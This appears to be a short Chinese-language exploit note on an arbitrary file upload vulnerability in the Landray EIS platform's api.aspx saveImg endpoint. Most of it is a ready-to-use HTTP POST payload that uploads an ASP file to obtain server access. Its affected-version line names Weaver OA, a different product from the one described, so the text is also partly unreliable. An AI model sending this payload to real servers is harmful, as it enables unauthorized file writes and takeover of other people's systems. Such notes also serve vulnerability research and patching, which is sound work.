**漏洞描述：**

蓝凌EIS 智慧协同平台api.aspx接口存在任意文件上传漏洞，攻击者可以利用接口写入文件，获取服务器权限。

**影响版本：**

泛微OA

**Payload：**

```jsx
POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: 127.0.0.1

User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10

Content-Length: 172

Content-Type: multipart/form-data; boundary=---***

Accept-Encoding: gzip, deflate, br

Connection: close

-----***
Content-Disposition: form-data; name="file"; filename="test.asp"
Content-Type: text/html

<% response.write("W8jwFQz7zkxLxXaUXp2BTB0O3rSSvnqb")%>
-----***--
```

---
